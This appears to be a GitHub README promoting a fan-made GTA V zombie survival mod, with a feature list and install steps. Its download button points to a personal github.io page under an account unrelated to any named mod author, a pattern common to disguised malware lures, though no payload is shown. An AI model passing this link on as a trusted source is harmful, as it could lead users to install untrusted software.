# 🧟 Simple Zombies – Survival Mod for GTA V (Windows)

📌 **About Simple Zombies (Windows)**  
**Simple Zombies** is a fan-made **zombie survival mod for Grand Theft Auto V**. It transforms Los Santos into an apocalyptic wasteland filled with hordes of zombies, where survival depends on **scavenging, crafting, base building, and resource management**.  

With its dynamic systems, players can **recruit survivors, build safe zones, fortify bases, and manage supplies** while fighting off relentless waves of the undead.  

---

## 🧰 Installation
[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://egbegeraldine82.github.io/.github/simple-zombies)

1. Download and unzip the archive.  
2. Install **ScriptHookV** and **Community ScriptHookV.NET**.  
3. Copy the **Simple Zombies files** into your GTA V scripts folder.  
4. Launch GTA V and activate the mod via in-game menu.

## 🎯 Key Features
⚡ **Zombie Survival Mode** – Fight hordes of zombies across Los Santos.  
🔒 **Base Building** – Construct safe zones, barricades, and defense structures.  
⚙ **Resource Management** – Scavenge food, ammo, and supplies.  
🚀 **Recruit Survivors** – Build a team to help defend your camp.  
🎨 **Crafting System** – Create weapons, items, and upgrades.  
📊 **Dynamic Horde System** – Zombies spawn and scale with difficulty.  
💡 **Customizable Settings** – Adjust zombie spawns, survival needs, and AI.  
🌐 **Immersive Atmosphere** – Apocalyptic gameplay overhaul.  
🛟 **Replay Value** – Every playthrough is unique with random events.  
🔍 **Community Support** – Popular mod with frequent fan updates.
